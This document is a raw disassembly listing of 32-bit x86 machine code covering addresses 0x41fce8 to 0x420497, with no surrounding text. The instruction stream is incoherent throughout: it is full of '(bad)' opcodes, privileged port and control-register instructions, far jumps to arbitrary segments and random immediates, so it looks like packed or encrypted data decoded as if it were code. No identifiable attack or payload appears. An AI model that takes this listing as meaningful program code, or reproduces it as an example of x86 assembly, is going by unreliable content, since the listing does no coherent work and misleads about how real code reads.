  41fce8:	test   eax,0xecb9131f
  41fced:	cli    
  41fcee:	mov    al,ds:0x78fb1e08
  41fcf3:	pop    es
  41fcf4:	and    edi,DWORD PTR ds:0xed8314bf
  41fcfa:	cmp    ebp,ecx
  41fcfc:	sbb    bl,BYTE PTR [ecx]
  41fcfe:	(bad)  
  41fcff:	js     0x41fd20
  41fd01:	xchg   ebx,eax
  41fd02:	sbb    al,BYTE PTR [eax]
  41fd04:	enter  0x7d4d,0xca
  41fd08:	test   al,0xa4
  41fd0a:	sub    ecx,DWORD PTR [edx+0xe]
  41fd0d:	fiadd  DWORD PTR ss:[esp+eax*4+0x1b]
  41fd12:	add    BYTE PTR [edx-0x52e40fdc],bl
  41fd18:	sar    DWORD PTR [edx],0xc3
  41fd1b:	les    ebp,FWORD PTR [eax+0x6df21eb6]
  41fd21:	retf   
  41fd22:	sub    eax,0xf6a13959
  41fd27:	(bad)  
  41fd28:	call   0xb18037d9
  41fd2d:	int    0xff
  41fd2f:	or     eax,0x2c53286e
  41fd34:	add    DWORD PTR [edx+0x6706dfcb],0xd37f4363
  41fd3e:	out    dx,al
  41fd3f:	jmp    0xa055:0xb287e08d
  41fd46:	mov    dl,0xf
  41fd48:	hlt    
  41fd49:	in     eax,0xb3
  41fd4b:	jb     0x41fce6
  41fd4d:	sbb    ebp,0x3d452aa8
  41fd53:	sub    al,0x3b
  41fd55:	icebp  
  41fd56:	retf   
  41fd57:	xor    BYTE PTR [ecx+0x70],ah
  41fd5a:	inc    edx
  41fd5b:	ss clc 
  41fd5d:	shl    ebp,0xe
  41fd60:	mov    ds:0xa31c8f08,al
  41fd65:	aas    
  41fd66:	mov    edx,DWORD PTR [eax-0x6b00a11c]
  41fd6c:	clc    
  41fd6d:	into   
  41fd6e:	xchg   edi,eax
  41fd6f:	xchg   BYTE PTR [ebx-0x50],cl
  41fd72:	fnstsw WORD PTR [eax+ebp*4+0x56d0806b]
  41fd79:	(bad)  
  41fd7a:	cmp    DWORD PTR [esi+ebx*8],edi
  41fd7d:	das    
  41fd7e:	sbb    esi,esp
  41fd80:	cwde   
  41fd81:	and    al,bl
  41fd83:	jne    0x41fd81
  41fd85:	pop    edx
  41fd86:	xchg   esp,eax
  41fd87:	push   esp
  41fd88:	imul   DWORD PTR fs:[ecx+eax*8+0x8d8eb34]
  41fd90:	adc    ah,BYTE PTR [ebx-0x700d030f]
  41fd96:	push   esi
  41fd97:	jge    0x41fdf5
  41fd99:	pop    ds
  41fd9a:	out    dx,eax
  41fd9b:	(bad)  [ecx-0x17]
  41fd9e:	jg     0x41fd31
  41fda0:	sbb    DWORD PTR [edx+ebx*1],edi
  41fda3:	inc    edi
  41fda4:	std    
  41fda5:	jp     0x41fe08
  41fda7:	cmp    eax,0x8727ec30
  41fdac:	stos   BYTE PTR es:[edi],al
  41fdad:	mov    al,0x9b
  41fdaf:	in     eax,dx
  41fdb0:	or     DWORD PTR [eax*8+0x3c6e2be6],0x27
  41fdb8:	das    
  41fdb9:	jl     0x41fdd6
  41fdbb:	retf   0xf622
  41fdbe:	inc    esp
  41fdbf:	(bad)  
  41fdc0:	int3   
  41fdc1:	dec    edx
  41fdc2:	xor    bl,BYTE PTR [esi+ebx*4+0x5fea8ce1]
  41fdc9:	adc    dl,dh
  41fdcb:	or     bl,cl
  41fdcd:	pop    ecx
  41fdce:	sub    bp,sp
  41fdd1:	retf   0x1d8a
  41fdd4:	push   ebx
  41fdd5:	dec    edx
  41fdd6:	adc    eax,0x887a107b
  41fddb:	mov    esp,0xcc864f65
  41fde0:	pop    ebp
  41fde1:	mov    al,ds:0x48f59d05
  41fde6:	sbb    eax,0xd4088b31
  41fdeb:	hlt    
  41fdec:	and    eax,0x93ed1e81
  41fdf1:	sbb    esp,edi
  41fdf3:	leave  
  41fdf4:	xchg   DWORD PTR [ebx],eax
  41fdf6:	sbb    al,0x90
  41fdf8:	sbb    DWORD PTR [esi],esi
  41fdfa:	imul   ecx,DWORD PTR [ebx+eax*4-0x777f3d80],0xbe4af1a9
  41fe05:	sti    
  41fe06:	pop    ebx
  41fe07:	mov    ecx,0xac117e4b
  41fe0c:	mov    edi,es
  41fe0e:	dec    ebx
  41fe0f:	in     al,dx
  41fe10:	sbb    DWORD PTR [ebx-0x8],ebx
  41fe13:	push   ds
  41fe14:	mov    ah,0xe2
  41fe16:	leave  
  41fe17:	repnz push eax
  41fe19:	arpl   WORD PTR [edx+edx*4],bx
  41fe1c:	das    
  41fe1d:	mov    ecx,0xed6125b5
  41fe22:	push   esp
  41fe23:	arpl   WORD PTR [edi],cx
  41fe25:	xchg   ecx,eax
  41fe26:	adc    BYTE PTR [edx+ebp*8+0x47],dl
  41fe2a:	sub    eax,0x196d9b5e
  41fe2f:	out    0xdf,al
  41fe31:	push   ebp
  41fe32:	clc    
  41fe33:	aas    
  41fe34:	pop    ecx
  41fe35:	jmp    0xf35b0b0c
  41fe3a:	fsubp  st(0),st
  41fe3c:	cli    
  41fe3d:	xor    BYTE PTR [esi+0x2f],0xe4
  41fe41:	in     eax,dx
  41fe42:	ror    DWORD PTR [edx+0x53899148],0x8d
  41fe49:	push   ds
  41fe4a:	or     BYTE PTR [edi],ah
  41fe4c:	fld    st(2)
  41fe4e:	pop    es
  41fe4f:	pop    eax
  41fe50:	pop    es
  41fe51:	clc    
  41fe52:	clc    
  41fe53:	dec    esi
  41fe54:	fstp   st(0)
  41fe56:	and    DWORD PTR [ebp+0x24],ebx
  41fe59:	or     al,0xb2
  41fe5b:	jmp    0x41fea0
  41fe5d:	frstpm(287 only) 
  41fe5f:	adc    edi,DWORD PTR [eax-0x2171b192]
  41fe65:	mov    esp,0xcae3eed0
  41fe6a:	sar    ebx,1
  41fe6c:	cmc    
  41fe6d:	mov    al,ds:0x34ba613f
  41fe72:	pop    esi
  41fe73:	test   eax,0xcd86e95b
  41fe78:	xor    eax,0xafd624cb
  41fe7d:	clc    
  41fe7e:	mov    ds:0xbf61dc49,al
  41fe83:	cs jmp 0x8c6c:0x536fc9e4
  41fe8b:	add    bl,BYTE PTR [esi+esi*2]
  41fe8e:	pop    eax
  41fe8f:	pop    es
  41fe90:	add    eax,DWORD PTR [edx+0x54873030]
  41fe96:	test   BYTE PTR [edx-0x6d4077dc],ah
  41fe9c:	mov    ah,0x5a
  41fe9e:	imul   edx,DWORD PTR [ebp+0x7],0xffffffab
  41fea2:	mov    edx,ebx
  41fea4:	inc    edi
  41fea5:	xor    eax,0x139ef887
  41feaa:	xchg   ecx,eax
  41feab:	xchg   edx,eax
  41feac:	mov    ecx,0x772db1c6
  41feb1:	cld    
  41feb2:	fld    QWORD PTR [eax]
  41feb4:	mov    WORD PTR [eax],ds
  41feb6:	mov    dh,dl
  41feb8:	pop    ecx
  41feb9:	(bad)  
  41febb:	out    0x5e,al
  41febd:	and    DWORD PTR [eax+0x7c4e070e],ebp
  41fec3:	add    dh,ch
  41fec5:	mov    al,ds:0x12c27808
  41feca:	scas   eax,DWORD PTR es:[edi]
  41fecb:	jns    0x41fe7c
  41fecd:	mov    bh,BYTE PTR [bp+si-0x2e]
  41fed1:	test   al,0xa1
  41fed3:	lahf   
  41fed4:	push   eax
  41fed5:	xchg   ebx,eax
  41fed6:	fst    DWORD PTR [esi+ebx*2+0x1c]
  41feda:	jnp    0x41fe78
  41fedc:	pop    ecx
  41fedd:	pop    ebx
  41fede:	pop    esi
  41fedf:	jmp    0xb60b:0x435fb37c
  41fee6:	pop    edx
  41fee7:	icebp  
  41fee8:	mov    ebx,0x2eeb7920
  41feed:	inc    ecx
  41feee:	imul   esi
  41fef0:	sub    BYTE PTR [eax],0x6f
  41fef3:	stos   BYTE PTR es:[edi],al
  41fef4:	cs stc 
  41fef6:	test   BYTE PTR [eax],cl
  41fef8:	fs loop 0x41fefe
  41fefb:	scas   al,BYTE PTR es:[edi]
  41fefc:	push   cs
  41fefd:	cmp    DWORD PTR [eax+esi*8-0x36],eax
  41ff01:	jg     0x41ff29
  41ff03:	ret    
  41ff04:	xor    eax,0xe71d8d74
  41ff09:	mov    ebx,0xc0375d76
  41ff0e:	jnp    0x41ff5c
  41ff10:	in     eax,0x89
  41ff12:	push   ebx
  41ff13:	nop
  41ff14:	enter  0xdb25,0x1b
  41ff18:	mov    edi,0xcb4f6cab
  41ff1d:	ja     0x41ff47
  41ff1f:	stos   BYTE PTR es:[edi],al
  41ff20:	outs   dx,BYTE PTR ds:[esi]
  41ff21:	rol    BYTE PTR [edi+0x36],1
  41ff24:	(bad)  
  41ff25:	mov    ebp,0x179d4f14
  41ff2a:	sub    al,0x0
  41ff2c:	xchg   edx,eax
  41ff2d:	fwait
  41ff2e:	sbb    eax,0x2aec46e9
  41ff33:	xchg   esp,eax
  41ff34:	cmp    dl,BYTE PTR [ebp+eiz*2-0x35a44c0b]
  41ff3b:	lmsw   ax
  41ff3e:	xchg   ecx,eax
  41ff3f:	push   esi
  41ff40:	call   0x7a02:0x2ba3fbdb
  41ff47:	pop    edx
  41ff48:	fild   QWORD PTR [ebx+0x10]
  41ff4b:	push   ds
  41ff4c:	in     al,0x34
  41ff4e:	and    dh,al
  41ff50:	mov    ch,0xb
  41ff52:	inc    ebp
  41ff53:	adc    esp,DWORD PTR [bx+di]
  41ff56:	gs aam 0x73
  41ff59:	sbb    dh,ah
  41ff5b:	dec    BYTE PTR [ebx+0x714ac47c]
  41ff61:	xchg   ecx,eax
  41ff62:	pushf  
  41ff63:	adc    eax,0x69722d1d
  41ff68:	pop    ebx
  41ff69:	in     al,dx
  41ff6a:	push   ds
  41ff6b:	mov    ebx,0x9d4dade1
  41ff70:	pop    eax
  41ff71:	in     eax,dx
  41ff72:	push   cs
  41ff73:	ins    DWORD PTR es:[edi],dx
  41ff74:	xchg   ecx,eax
  41ff75:	cli    
  41ff76:	pop    ebx
  41ff77:	cmp    BYTE PTR [edi],cl
  41ff79:	lahf   
  41ff7a:	sub    dh,BYTE PTR [eax+0x10c5154f]
  41ff80:	inc    ecx
  41ff81:	push   eax
  41ff82:	add    dl,ah
  41ff84:	cdq    
  41ff85:	push   ecx
  41ff86:	test   BYTE PTR [edx+0x34],0xed
  41ff8a:	fs mov edx,0xaff4f285
  41ff90:	repnz push ebp
  41ff92:	fs nop
  41ff94:	aaa    
  41ff95:	aad    0xf7
  41ff97:	(bad)  
  41ff98:	jmp    0x420011
  41ff9a:	leave  
  41ff9b:	sub    esp,DWORD PTR [eax+0x63]
  41ff9e:	jne    0x41ff5b
  41ffa0:	imul   esi,esi,0x81e7e433
  41ffa6:	sub    al,0xf4
  41ffa8:	in     eax,0xf6
  41ffaa:	(bad)  
  41ffac:	dec    edi
  41ffad:	je     0x41ffc2
  41ffaf:	or     bl,BYTE PTR [ebp-0x62]
  41ffb2:	xchg   ecx,eax
  41ffb3:	pushw  ss
  41ffb5:	sbb    cl,BYTE PTR [edx]
  41ffb7:	ss dec eax
  41ffba:	xchg   ebp,eax
  41ffbb:	retf   0xe5cd
  41ffbe:	jo     0x420003
  41ffc0:	ret    
  41ffc1:	sub    eax,0x2d646cfa
  41ffc6:	mov    DWORD PTR ds:0x58c6e528,edi
  41ffcc:	mov    bh,0xfc
  41ffce:	mov    eax,ds:0x7298ec39
  41ffd3:	sub    dh,bl
  41ffd5:	mov    ds:0xedd44c08,eax
  41ffda:	and    esp,DWORD PTR [edx]
  41ffdc:	stos   DWORD PTR es:[edi],eax
  41ffdd:	cmp    ch,BYTE PTR [edi-0x30]
  41ffe0:	dec    edi
  41ffe1:	mov    al,0xd0
  41ffe3:	push   ecx
  41ffe4:	push   0x554388d
  41ffe9:	push   ss
  41ffea:	fisub  WORD PTR [ecx]
  41ffec:	mov    dl,0xf3
  41ffee:	dec    esi
  41ffef:	push   bx
  41fff1:	jmp    0x8201:0xa576dddc
  41fff8:	xchg   ebx,esi
  41fffa:	fisttp WORD PTR [ecx+ebp*2-0xd]
  41fffe:	xchg   esi,eax
  41ffff:	fnstcw WORD PTR [ebx-0x45]
  420002:	sub    bh,BYTE PTR [esi+0x30]
  420005:	scas   al,BYTE PTR es:[edi]
  420006:	sub    al,0xab
  420008:	(bad)  
  420009:	idiv   BYTE PTR [edx]
  42000b:	push   0x79
  42000d:	neg    BYTE PTR [edi-0x7d2bf990]
  420013:	dec    bp
  420015:	fadd   DWORD PTR [ebx-0x40]
  420018:	pop    ds
  420019:	sub    BYTE PTR ss:[edx-0x2a],bl
  42001d:	push   0xe6e2d6cd
  420022:	ins    BYTE PTR es:[edi],dx
  420023:	int    0x5b
  420025:	sbb    DWORD PTR [ebp+0xb],eax
  420028:	inc    esp
  420029:	call   0xef2faf5e
  42002e:	cmp    BYTE PTR [edi-0x16],dh
  420031:	dec    edi
  420032:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420033:	dec    ebp
  420034:	push   ecx
  420035:	out    0x6,al
  420037:	pop    ds
  420038:	mov    esi,0xb39e8a38
  42003d:	sub    edx,DWORD PTR [ebp+ebx*2-0x71b0a696]
  420044:	cwde   
  420045:	stc    
  420046:	div    BYTE PTR [ebx+0x56]
  420049:	add    esi,esi
  42004b:	repnz (bad) 
  42004d:	into   
  42004e:	dec    ebx
  42004f:	dec    esi
  420050:	mov    bh,0xda
  420052:	test   eax,0xc44ba0eb
  420057:	retf   
  420058:	add    al,0xf8
  42005a:	fdiv   DWORD PTR [edx-0x2b]
  42005d:	ja     0x420070
  42005f:	dec    edi
  420060:	clts   
  420062:	xor    bl,0x9b
  420065:	inc    ebx
  420066:	retf   
  420067:	dec    edx
  420068:	sub    ah,BYTE PTR [ebx]
  42006a:	in     eax,0xaa
  42006c:	stos   BYTE PTR es:[edi],al
  42006d:	jge    0x420033
  42006f:	cmp    DWORD PTR [edi],ebx
  420071:	(bad)  
  420072:	bound  esi,QWORD PTR [eax]
  420074:	aad    0xb4
  420076:	ja     0x420042
  420078:	outs   dx,BYTE PTR ds:[esi]
  420079:	pop    eax
  42007a:	push   edi
  42007b:	inc    ecx
  42007c:	ror    DWORD PTR [ebx-0x45a8ef5a],0x80
  420083:	inc    esp
  420084:	daa    
  420085:	aam    0xf2
  420087:	(bad)  
  420088:	leave  
  420089:	xchg   edx,eax
  42008a:	adc    bl,BYTE PTR [ebx+0x2b439392]
  420090:	pop    ss
  420091:	adc    eax,esi
  420093:	aaa    
  420094:	mov    eax,0x99ad6452
  420099:	adc    BYTE PTR [eax-0x6b6312a0],bh
  42009f:	ror    BYTE PTR [ebx-0x3e93ba60],0x15
  4200a6:	add    eax,0x6289e8c0
  4200ab:	xchg   ecx,eax
  4200ac:	xchg   esp,eax
  4200ad:	daa    
  4200ae:	mov    ch,bh
  4200b0:	das    
  4200b1:	arpl   si,sp
  4200b3:	sub    ebp,edx
  4200b5:	mov    WORD PTR [ecx-0x4ed9fa17],ds
  4200bb:	fwait
  4200bc:	and    eax,0xea3ce822
  4200c1:	(bad)  [ecx-0x9]
  4200c4:	inc    esp
  4200c5:	fmul   DWORD PTR fs:[eax-0x596fb3c3]
  4200cc:	push   ecx
  4200cd:	mov    eax,0x57a12521
  4200d2:	in     eax,dx
  4200d3:	xchg   esp,eax
  4200d4:	dec    eax
  4200d5:	pop    ecx
  4200d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200d7:	mov    ds:0xb6aff92a,eax
  4200dc:	call   0xdf78f404
  4200e1:	scas   eax,DWORD PTR es:[edi]
  4200e2:	aam    0xaf
  4200e4:	mov    edi,0x17a14bf8
  4200e9:	ins    BYTE PTR es:[edi],dx
  4200ea:	pop    es
  4200eb:	aad    0xfe
  4200ed:	clc    
  4200ee:	jp     0x4200e7
  4200f0:	xor    eax,0x891263ca
  4200f5:	neg    BYTE PTR [ecx+0x6f]
  4200f8:	sbb    BYTE PTR [edi+0x77916db4],0x57
  4200ff:	cwde   
  420100:	mov    eax,ds:0xb319dd72
  420105:	mov    esi,0x7f493897
  42010a:	jbe    0x420148
  42010c:	loope  0x420158
  42010e:	add    al,0x1c
  420111:	jne    0x420142
  420113:	cmp    DWORD PTR es:[esi-0x28],ebx
  420117:	imul   esp,DWORD PTR [edx],0xb3d9012d
  42011d:	jns    0x4200b3
  42011f:	sbb    DWORD PTR [eax-0x4ad83fe0],esp
  420125:	sbb    ebx,ebx
  420127:	pop    esp
  420128:	(bad)
  42012b:	or     dh,BYTE PTR ss:0xc974e4f9
  420132:	add    al,0xeb
  420134:	add    ecx,eax
  420136:	inc    esi
  420137:	cmc    
  420138:	nop
  420139:	fs inc esp
  42013b:	add    bl,al
  42013d:	dec    esi
  42013e:	push   ecx
  42013f:	test   eax,0x4b80af0f
  420144:	loope  0x420180
  420146:	push   ebp
  420147:	daa    
  420148:	push   ebx
  420149:	or     edx,DWORD PTR [edx+eax*8+0x9cd0d74]
  420150:	push   edi
  420151:	dec    ebx
  420152:	test   BYTE PTR [edx],ah
  420154:	inc    esp
  420155:	fdiv   DWORD PTR [esi-0x3b]
  420158:	dec    edx
  420159:	jns    0x420100
  42015b:	(bad)  
  42015c:	outs   dx,DWORD PTR ds:[esi]
  42015d:	leave  
  42015e:	xchg   edi,eax
  42015f:	add    bh,BYTE PTR [ebp+0x6a88bb20]
  420165:	add    edi,DWORD PTR ds:0x1d3b96c6
  42016b:	clc    
  42016c:	aam    0x43
  42016e:	add    edi,ecx
  420170:	xlat   BYTE PTR ds:[ebx]
  420171:	ja     0x420139
  420173:	out    dx,eax
  420174:	pop    ecx
  420175:	icebp  
  420176:	cmc    
  420177:	cs jg  0x42012e
  42017a:	data16 mov dh,0x3f
  42017d:	xchg   edi,eax
  42017e:	les    edx,FWORD PTR [esp+edx*8+0x34]
  420182:	je     0x420126
  420184:	pusha  
  420185:	inc    esp
  420186:	sbb    eax,0x7a5214ea
  42018b:	push   eax
  42018c:	lock out 0x42,al
  42018f:	push   ss
  420190:	sbb    esi,DWORD PTR [edi+eiz*1]
  420193:	ds lock scas al,BYTE PTR es:[edi]
  420196:	sbb    al,0x79
  420198:	jbe    0x4201c1
  42019a:	dec    ebx
  42019b:	sbb    dl,al
  42019d:	fwait
  42019e:	shl    DWORD PTR [eax],cl
  4201a0:	push   ss
  4201a1:	call   0xc4784916
  4201a6:	repnz pop ebx
  4201a8:	iret   
  4201a9:	out    0xf2,al
  4201ab:	sbb    edi,DWORD PTR [esi-0x66]
  4201ae:	mov    WORD PTR [ebp-0x71],gs
  4201b1:	and    al,0xde
  4201b3:	mov    esi,0x31e247ee
  4201b8:	mov    ds:0xf4cc236a,al
  4201bd:	and    edx,DWORD PTR [edi-0x2d824859]
  4201c3:	scas   al,BYTE PTR es:[edi]
  4201c4:	popa   
  4201c5:	rcl    DWORD PTR [ebx+ecx*2+0x2e846385],0xd6
  4201cd:	cs and al,0x58
  4201d0:	shl    BYTE PTR [edi-0x71],cl
  4201d3:	pop    esp
  4201d4:	int    0x80
  4201d6:	sbb    cl,ah
  4201d8:	mov    al,0x5
  4201da:	cmp    dl,BYTE PTR [ecx]
  4201dc:	(bad)  
  4201df:	xor    al,0x29
  4201e1:	call   0xd91e:0xdbb2e236
  4201e8:	fwait
  4201e9:	or     al,0xca
  4201eb:	jge    0x420195
  4201ed:	jl     0x42018b
  4201ef:	stc    
  4201f0:	cwde   
  4201f1:	pop    ebp
  4201f2:	fild   WORD PTR [ebx+0xd]
  4201f5:	pop    edx
  4201f6:	popf   
  4201f7:	(bad)  
  4201f8:	push   eax
  4201f9:	jp     0x4201e8
  4201fb:	mov    ah,0x75
  4201fd:	nop
  4201fe:	inc    edx
  4201ff:	pop    ebx
  420200:	shl    DWORD PTR [edi+eiz*4],1
  420203:	outs   dx,DWORD PTR ds:[esi]
  420204:	out    0x6,al
  420206:	jp     0x420230
  420208:	inc    eax
  420209:	(bad)  
  42020a:	jp     0x4201b7
  42020c:	or     esp,edx
  42020e:	clc    
  42020f:	adc    eax,0xbdd51350
  420214:	fwait
  420215:	push   ecx
  420216:	xchg   edi,eax
  420217:	lods   eax,DWORD PTR ds:[esi]
  420218:	xlat   BYTE PTR ds:[ebx]
  420219:	cmp    DWORD PTR [ecx-0x7b],ebp
  42021c:	jo     0x420227
  42021e:	mov    WORD PTR [edi-0xa88a4f8],ds
  420224:	mov    al,0xbe
  420226:	xchg   esp,eax
  420227:	or     bh,BYTE PTR [edi-0x3]
  42022a:	dec    eax
  42022b:	(bad)  
  42022c:	lods   al,BYTE PTR ds:[esi]
  42022d:	test   BYTE PTR [edx],dl
  42022f:	sub    BYTE PTR [eax],dh
  420231:	xchg   esp,eax
  420232:	or     eax,0xb54b91ff
  420237:	fsubr  QWORD PTR [esi+0x31d754b8]
  42023d:	mov    esp,0xe3ce3440
  420242:	test   al,0xfa
  420244:	(bad)  
  420246:	inc    edi
  420247:	popf   
  420248:	cmp    al,0xbc
  42024a:	cmp    ebp,DWORD PTR [ebx-0xc52d4a6]
  420250:	into   
  420251:	mov    ch,0x4a
  420253:	(bad)  [esi]
  420255:	shl    BYTE PTR [esi+eiz*8+0x14],1
  420259:	jnp    0x4201e2
  42025b:	pop    edx
  42025c:	sbb    DWORD PTR [eax],esp
  42025e:	pop    ecx
  42025f:	pop    dx
  420261:	stos   DWORD PTR es:[edi],eax
  420262:	rcr    BYTE PTR [edi],cl
  420264:	shl    BYTE PTR [ecx],cl
  420266:	jae    0x42022b
  420268:	inc    eax
  420269:	mov    ch,0xf1
  42026b:	repnz mov edx,0x7036e39e
  420271:	repz (bad) 
  420273:	aad    0x35
  420275:	fdiv   QWORD PTR [esi+0x69]
  420278:	loop   0x4202b1
  42027a:	(bad)
  42027d:	push   es
  42027e:	xchg   DWORD PTR [ebp+0x3bfc469f],esi
  420284:	sbb    BYTE PTR [esi],al
  420286:	js     0x420287
  420288:	mov    eax,ds:0x58cd68f6
  42028d:	or     al,0xb6
  42028f:	ja     0x42023e
  420291:	popa   
  420292:	lods   al,BYTE PTR ds:[esi]
  420293:	and    al,0xfb
  420295:	scas   eax,DWORD PTR es:[edi]
  420296:	cmp    eax,0x517e49b
  42029b:	aam    0x22
  42029d:	and    eax,0xbc49ae44
  4202a2:	(bad)  
  4202a3:	jmp    0x243ecf82
  4202a8:	push   eax
  4202a9:	pop    esi
  4202aa:	pop    esp
  4202ab:	and    DWORD PTR [ecx+0x42],esp
  4202ae:	jecxz  0x420276
  4202b0:	inc    ebp
  4202b1:	jg     0x420234
  4202b3:	(bad)  
  4202b4:	push   esi
  4202b5:	aas    
  4202b6:	ins    BYTE PTR es:[edi],dx
  4202b7:	loope  0x420276
  4202b9:	stos   DWORD PTR es:[edi],eax
  4202ba:	(bad)  
  4202bb:	mov    edx,0xa89a93f4
  4202c0:	sub    BYTE PTR [edx+0x28],0x2c
  4202c4:	cmovl  edi,DWORD PTR [ebp+0x78]
  4202c8:	inc    eax
  4202c9:	jno    0x4202fd
  4202cb:	popa   
  4202cc:	(bad)  [edx+0x51be8cc4]
  4202d2:	daa    
  4202d3:	dec    ebp
  4202d4:	int3   
  4202d5:	sbb    al,0x38
  4202d7:	pop    ss
  4202d8:	push   edx
  4202d9:	dec    edi
  4202da:	out    dx,al
  4202db:	ins    DWORD PTR es:[edi],dx
  4202dc:	mov    BYTE PTR ds:0x60555f70,bh
  4202e2:	ror    DWORD PTR [ecx+0x5a],0x20
  4202e6:	mov    DWORD PTR [esi-0x1a],edi
  4202e9:	mov    edi,0x93a31b24
  4202ee:	xor    eax,0x98e53329
  4202f3:	adc    bh,BYTE PTR [esi+0x7cfcdbba]
  4202f9:	test   ah,dh
  4202fb:	aam    0xf8
  4202fd:	fst    QWORD PTR [esi]
  4202ff:	jns    0x4202f9
  420301:	mov    esi,0x3d1df6a8
  420306:	mov    ds:0xc90b2207,al
  42030b:	repz in eax,dx
  42030d:	inc    ebp
  42030e:	mov    ebx,0x2a700130
  420313:	je     0x4202d0
  420315:	nop
  420316:	mov    al,BYTE PTR ss:[edi-0x66d14082]
  42031d:	(bad)  
  42031e:	fcmovnu st,st(5)
  420320:	repz pop ecx
  420322:	mov    ebx,ecx
  420324:	xchg   ebx,eax
  420325:	cwde   
  420326:	pusha  
  420327:	lods   al,BYTE PTR ds:[esi]
  420328:	jo     0x4202e9
  42032a:	xchg   ebx,ebp
  42032c:	bound  esi,QWORD PTR [ebx-0x63]
  42032f:	and    ch,BYTE PTR [esi+ebp*8-0x61a9993e]
  420336:	(bad)  
  420337:	jmp    0x4202c1
  420339:	jo     0x420322
  42033b:	dec    edx
  42033c:	out    dx,al
  42033d:	stos   DWORD PTR es:[edi],eax
  42033e:	jne    0x420388
  420340:	mov    ebp,0x696dfa7
  420345:	cmp    ebp,edx
  420347:	lock sub DWORD PTR [esi],0xdb742000
  42034e:	or     eax,0x6ef42c08
  420353:	ret    
  420354:	inc    ebp
  420355:	push   esp
  420356:	test   BYTE PTR [edi-0x5fe2171b],0x9b
  42035d:	es and al,0x45
  420360:	sbb    edx,DWORD PTR [eax+0x3309af60]
  420366:	fcom   QWORD PTR [ebx+0x1fec45f]
  42036c:	xchg   esi,eax
  42036d:	adc    al,0xae
  42036f:	retf   
  420370:	test   al,0xb5
  420372:	mov    ds:0x93b9b3d3,al
  420377:	and    cl,dl
  420379:	push   0x4
  42037b:	sti    
  42037c:	jno    0x42031c
  42037e:	stos   DWORD PTR es:[edi],eax
  42037f:	outs   dx,DWORD PTR ds:[si]
  420381:	or     ecx,DWORD PTR [esi-0x393fc03c]
  420387:	adc    DWORD PTR [ecx-0x8c322b2],edx
  42038d:	or     al,cl
  42038f:	stos   BYTE PTR es:[edi],al
  420390:	(bad)  
  420391:	cs pop ebp
  420393:	dec    ecx
  420394:	sub    DWORD PTR [edi+ebx*2-0x79f5b5b8],ecx
  42039b:	lods   al,BYTE PTR ds:[si]
  42039d:	mov    ss,WORD PTR [ebx+0x4486ddc7]
  4203a3:	mov    ebx,0xb1a97ac
  4203a8:	inc    edi
  4203a9:	shl    DWORD PTR [ebp-0x5],cl
  4203ac:	stos   BYTE PTR es:[edi],al
  4203ad:	xor    eax,0x9d97b344
  4203b2:	ja     0x420369
  4203b4:	push   esp
  4203b5:	xor    edi,DWORD PTR [ecx]
  4203b7:	js     0x4203dc
  4203b9:	aaa    
  4203ba:	outs   dx,DWORD PTR ds:[esi]
  4203bb:	jnp    0x420406
  4203bd:	add    DWORD PTR [ebx-0x60],esi
  4203c0:	(bad)  
  4203c1:	pop    ebp
  4203c2:	mov    ecx,gs
  4203c4:	cmp    ah,BYTE PTR [edi-0x66]
  4203c7:	nop
  4203c8:	adc    BYTE PTR [edi-0x4e2ba0ce],ch
  4203ce:	fs xor al,0xfc
  4203d1:	mov    ebx,0xf3b2fec
  4203d6:	jo     0x420417
  4203d8:	mov    ds:0x39f390ce,eax
  4203dd:	push   ebx
  4203de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203df:	repz cmp BYTE PTR [eax-0x5c],ah
  4203e3:	es sahf 
  4203e5:	repz push edx
  4203e7:	fidivr WORD PTR [edi+0x1f]
  4203ea:	test   DWORD PTR [edx-0x50],edi
  4203ed:	into   
  4203ee:	or     BYTE PTR [edi-0x80],bl
  4203f1:	imul   edx,eax,0xffffffa4
  4203f4:	cmp    eax,0x233a2ffe
  4203f9:	dec    ecx
  4203fa:	shr    DWORD PTR [eax+0x21],1
  4203fd:	or     eax,DWORD PTR [ecx]
  4203ff:	ins    BYTE PTR es:[edi],dx
  420400:	mov    WORD PTR [eax],ss
  420402:	out    dx,eax
  420403:	repz scas al,BYTE PTR es:[edi]
  420405:	mov    eax,DWORD PTR [bp+di-0x6ac3]
  42040a:	mov    ecx,0x6d8960cd
  42040f:	sti    
  420410:	mov    ecx,0xd20ea83c
  420415:	loop   0x420400
  420417:	jo     0x4203c7
  420419:	icebp  
  42041a:	loop   0x42039f
  42041c:	aam    0x10
  42041e:	in     eax,0x77
  420420:	into   
  420421:	hlt    
  420422:	add    eax,0xd7c9fc23
  420427:	and    BYTE PTR ds:[ebx+eiz*4-0x45],cl
  42042c:	adc    BYTE PTR [ebp+0x6bfd440a],0x3e
  420433:	cmp    ax,0x7446
  420437:	aas    
  420438:	stos   DWORD PTR es:[edi],eax
  420439:	sub    esp,DWORD PTR [ecx+0x13]
  42043c:	mov    cl,0x55
  42043e:	(bad)  
  42043f:	push   ss
  420440:	bound  edx,QWORD PTR [eax+0x33]
  420443:	or     DWORD PTR [edi-0x72],esp
  420446:	retf   
  420447:	jnp    0x4203fa
  420449:	leave  
  42044a:	jae    0x42042e
  42044c:	data16 mov al,0x24
  42044f:	out    0x24,al
  420451:	stos   DWORD PTR es:[edi],eax
  420452:	mov    BYTE PTR [ebx],bl
  420454:	stos   BYTE PTR es:[edi],al
  420455:	xchg   esi,eax
  420456:	cs adc bh,dl
  420459:	addr16 cwde 
  42045b:	mov    ebx,0x74387032
  420460:	pop    ebp
  420461:	lods   eax,DWORD PTR ds:[esi]
  420462:	popw   ss
  420464:	ret    0xf500
  420467:	pop    esp
  420468:	pushf  
  420469:	stos   BYTE PTR es:[edi],al
  42046a:	and    ebp,edx
  42046c:	and    DWORD PTR [ecx-0x3437848a],eax
  420472:	pushf  
  420473:	repz loopne 0x4204b8
  420476:	add    eax,esi
  420478:	jns    0x42046f
  42047a:	mov    ah,0x99
  42047c:	scas   eax,DWORD PTR es:[edi]
  42047d:	and    eax,0x191dc60c
  420482:	repnz pop ebx
  420484:	push   ebx
  420485:	cmp    eax,0xd27c59aa
  42048a:	div    BYTE PTR [esi+0x4f]
  42048d:	leave  
  42048e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42048f:	cli    
  420490:	out    dx,eax
  420491:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420492:	mov    ds:0xaf630dcd,eax
  420497:	inc    ebp
